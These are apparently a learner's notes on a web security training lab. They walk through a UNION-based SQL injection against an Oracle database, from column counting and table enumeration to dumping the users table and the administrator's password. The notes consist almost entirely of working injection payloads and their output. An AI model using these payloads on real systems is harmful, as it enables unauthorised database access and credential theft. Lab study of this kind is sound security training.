Lab #10 - SQL injection attack, listing the database contents on Oracle

End Goals:
- Determine which table contains the usernames and passwords
- Determine the column names in table
- Output the content of the table
- Login as the administrator user 

Analysis:

1) Determine the number of columns
' order by 3-- -> internal server error

3 - 1 = 2

2) Find data type of columns
' UNION select 'a', 'a' from DUAL--
-> Oracle database
-> both columns accept type text

3) Output the list of tables in the database

' UNION SELECT table_name, NULL FROM all_tables--

USERS_JYPOMG

4) Output the column names of the users table

' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_JYPOMG'-- 

USERNAME_LDANZP
PASSWORD_DYZWEQ

5) Output the list of usernames/passwords

' UNION select USERNAME_LDANZP, PASSWORD_DYZWEQ from USERS_JYPOMG--

administrator
c30j8bn7ejg50isvbiie

